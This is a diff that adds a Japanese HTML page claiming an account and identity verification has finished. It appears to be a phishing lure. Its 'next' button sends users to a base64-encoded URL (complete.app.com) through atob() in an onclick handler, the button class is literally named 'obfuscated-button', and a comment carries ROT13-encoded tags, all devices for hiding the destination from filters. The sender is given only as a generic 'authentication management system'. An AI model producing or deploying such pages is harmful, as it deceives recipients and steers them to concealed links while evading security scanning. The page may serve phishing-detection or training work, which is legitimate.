@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ja-JP">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>完了のお知らせ</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', 'Arial', sans-serif; background-color: #f5f5f5; }
+        .container { max-width: 600px; margin: 20px auto; background: #fff; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+        .header { background: linear-gradient(135deg, #388e3c 0%, #1b5e20 100%); color: #fff; padding: 40px 20px; text-align: center; }
+        .header h2 { font-size: 26px; margin: 0; font-weight: 600; }
+        .header p { margin-top: 10px; font-size: 15px; opacity: 0.95; }
+        .content { padding: 40px 25px; color: #333; line-height: 1.8; text-align: center; }
+        .content p { margin: 15px 0; font-size: 14px; color: #555; }
+        .success-badge { display: inline-block; background: #e8f5e9; border: 2px solid #4caf50; border-radius: 50%; width: 80px; height: 80px; line-height: 80px; font-size: 40px; margin: 20px 0; }
+        .divider { height: 1px; background: linear-gradient(90deg, transparent, #ddd, transparent); margin: 25px 0; }
+        .completion-info { background: #f0f8ff; border-left: 4px solid #2196f3; padding: 15px; margin: 20px 0; border-radius: 4px; font-size: 13px; color: #1565c0; }
+        .obfuscated-button { background: linear-gradient(135deg, #388e3c 0%, #1b5e20 100%); color: #fff; padding: 14px 35px; text-decoration: none; border-radius: 6px; font-size: 15px; font-weight: 600; margin: 20px 0; transition: all 0.3s ease; box-shadow: 0 4px 10px rgba(56, 142, 60, 0.3); border: none; cursor: pointer; display: inline-block; }
+        .obfuscated-button:hover { background: linear-gradient(135deg, #1b5e20 0%, #1b4d1b 100%); box-shadow: 0 6px 15px rgba(56, 142, 60, 0.4); transform: translateY(-2px); }
+        .footer { padding: 15px 20px; background: #fafafa; border-top: 1px solid #eee; text-align: center; font-size: 12px; color: #888; }
+    </style>
+</head>
+<body>
+    <!-- meta: kd-10-pbzcyrgr | pbzcyrgvba -->
+    <div class="container">
+        <div class="header">
+            <h2>認証プロセスが完了いたしました</h2>
+            <p>ありがとうございました</p>
+        </div>
+        <div class="content">
+            <div class="success-badge">✓</div>
+            <p><strong>プロセス完了</strong></p>
+            <p>お客様のご確認をいただき、ありがとうございました。</p>
+            <p>認証プロセスが正常に完了いたしました。</p>
+            <div class="divider"></div>
+            <div class="completion-info">
+                <p><strong>実施した対応：</strong></p>
+                <p style="margin-top: 8px;">
+                    ✓ アカウント確認<br>
+                    ✓ 本人確認<br>
+                    ✓ セキュリティ検証<br>
+                    ✓ プロセス完了
+                </p>
+            </div>
+            <div class="divider"></div>
+            <div class="button-container">
+                <button class="obfuscated-button" onclick="window.location.href=atob('aHR0cHM6Ly9jb21wbGV0ZS5hcHAuY29tL2ZvcndhcmQ=');">
+                    次へ進む
+                </button>
+            </div>
+            <div class="divider"></div>
+            <p style="font-size: 13px; color: #666;">
+                今後もサービスをご利用いただけます。<br>
+                ご不明な点がございましたら、サポートまでお気軽にお問い合わせください。
+            </p>
+        </div>
+        <div class="footer"><p>&copy; 2025 認証管理システム</p></div>
+    </div>
+</body>
+</html>
+
